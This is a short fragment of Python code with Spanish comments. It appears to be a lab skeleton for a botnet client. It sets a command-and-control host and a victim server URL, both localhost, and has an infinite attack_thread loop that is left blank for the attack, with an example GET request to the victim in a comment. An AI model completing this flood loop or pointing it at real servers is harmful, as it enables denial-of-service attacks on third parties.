...
CNC_HOST = "127.0.0.1" # <-- IP DEL C&C DEL ASISTENTE
CNC_PORT = 9999

# Servidor víctima
VICTIM_IP = "127.0.0.1" # <-- IP DEL SERVIDOR VÍCTIMA
VICTIM_PORT = 1234
VICTIM_URL = f"http://{VICTIM_IP}:{VICTIM_PORT}/load"
...
def attack_thread():
    ...
    while True:
        try:
            # Rellenar con el ataque.
            #Ejemplo de GET: requests.get(VICTIM_URL, timeout=5, data="")
            pass
        except:
            pass
